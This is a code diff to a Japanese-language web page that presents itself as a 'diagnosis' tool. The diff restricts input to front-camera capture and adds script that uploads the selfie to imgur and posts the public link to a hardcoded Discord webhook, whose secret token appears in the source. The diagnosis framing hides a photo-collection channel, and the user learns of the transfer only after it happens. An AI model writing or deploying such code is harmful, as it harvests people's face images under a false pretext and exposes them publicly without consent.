@@ -69,22 +69,67 @@
   <button class="main-button" onclick="showOptions()">診断する</button>
 
   <div class="upload-options" id="uploadOptions">
-    <!-- ファイル選択 -->
-    <label class="option-button">
-      ファイルを選択
-      <input type="file" accept="image/*">
-    </label>
-
-    <!-- 写真を撮る（インカメラ） -->
     <label class="option-button">
       写真を撮る
-      <input type="file" accept="image/*" capture="user">
+      <input type="file"
+             accept="image/*"
+             capture="user"
+             onchange="handlePhoto(this)">
     </label>
   </div>
 
   <script>
+    // あなたの情報に書き換え済み
+    const IMGUR_CLIENT_ID     = '6e1b6bf28c5da0e';
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u';
+
+    // 「診断する」ボタンを押したとき
     function showOptions() {
       document.getElementById('uploadOptions').style.display = 'flex';
+    }
+
+    // カメラで写真を撮影したときの処理
+    function handlePhoto(input) {
+      if (!input.files || !input.files[0]) return;
+
+      const file = input.files[0];
+      const reader = new FileReader();
+
+      reader.onloadend = () => {
+        const base64Image = reader.result.split(',')[1];
+
+        // ① imgurへアップロード
+        fetch('https://api.imgur.com/3/image', {
+          method: 'POST',
+          headers: {
+            Authorization: `Client-ID ${IMGUR_CLIENT_ID}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ image: base64Image, type: 'base64' })
+        })
+        .then(res => res.json())
+        .then(json => {
+          const imageUrl = json.data.link;
+
+          // ② Discord Webhook にURLを送信
+          return fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              content: `📸 新しい写真がアップされました！\n${imageUrl}`
+            })
+          });
+        })
+        .then(() => {
+          alert('写真のURLをDiscordに送信しました！');
+        })
+        .catch(err => {
+          console.error(err);
+          alert('送信に失敗しました…コンソールを確認してください。');
+        });
+      };
+
+      reader.readAsDataURL(file);
     }
   </script>
 </body>
